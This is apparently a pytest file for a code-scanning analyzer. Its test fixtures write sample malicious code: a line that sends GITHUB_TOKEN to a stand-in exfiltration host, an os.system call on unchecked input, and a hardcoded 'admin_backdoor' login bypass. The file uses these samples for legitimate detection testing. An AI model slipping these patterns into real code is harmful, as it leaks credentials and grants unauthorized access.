"""
Unit tests for the Semantic Analysis Subsystem.
Tests:
- Dynamic execution detection
- Subprocess execution detection
- Network communication detection
- Credential access & exfiltration correlation
- Hardcoded authentication bypass detection
- Clean code zero-risk baseline
"""

import tempfile
from pathlib import Path
import pytest

from topochain.core.semantic.analyzer import SemanticAnalyzer, SemanticAnalysisResult


def test_clean_code_semantic_baseline():
    analyzer = SemanticAnalyzer()
    with tempfile.TemporaryDirectory() as tmpdir:
        td = Path(tmpdir)
        (td / "math_utils.py").write_text('''
def add(a: int, b: int) -> int:
    return a + b

def multiply(a: int, b: int) -> int:
    return a * b
''')

        res = analyzer.analyze_directory(tmpdir)
        assert res.risk_score == 0.0
        assert len(res.evidence) == 0
        assert len(res.capabilities_detected) == 0


def test_dynamic_execution_and_subprocess():
    analyzer = SemanticAnalyzer()
    with tempfile.TemporaryDirectory() as tmpdir:
        td = Path(tmpdir)
        (td / "script.py").write_text('''
import os

def run_command(cmd):
    eval("print('running')")
    os.system(cmd)
''')

        res = analyzer.analyze_directory(tmpdir)
        assert res.risk_score >= 0.70
        assert "DYNAMIC_EXECUTION" in res.capabilities_detected
        assert "SUBPROCESS_EXECUTION" in res.capabilities_detected


def test_data_exfiltration_correlation():
    analyzer = SemanticAnalyzer()
    with tempfile.TemporaryDirectory() as tmpdir:
        td = Path(tmpdir)
        (td / "exfil.py").write_text('''
import os
import urllib.request

def dump_environment():
    token = os.environ.get("GITHUB_TOKEN")
    urllib.request.urlopen("https://exfil-target.net/sink", data=token.encode())
''')

        res = analyzer.analyze_directory(tmpdir)
        assert res.risk_score >= 0.90
        assert "NETWORK_COMMUNICATION" in res.capabilities_detected
        assert "ENVIRONMENT_ACCESS" in res.capabilities_detected
        assert any("HIGH CONFIDENCE: Simultaneous presence" in f for f in res.findings)


def test_authentication_bypass_detection():
    analyzer = SemanticAnalyzer()
    with tempfile.TemporaryDirectory() as tmpdir:
        td = Path(tmpdir)
        (td / "auth.py").write_text('''
def check_user(user, token):
    if user.name == 'admin_backdoor':
        return True
    return False
''')

        res = analyzer.analyze_directory(tmpdir)
        assert res.risk_score >= 0.85
        assert "AUTHENTICATION_BYPASS" in res.capabilities_detected
        assert any("CRITICAL: Detected hardcoded conditional authentication bypass" in f for f in res.findings)
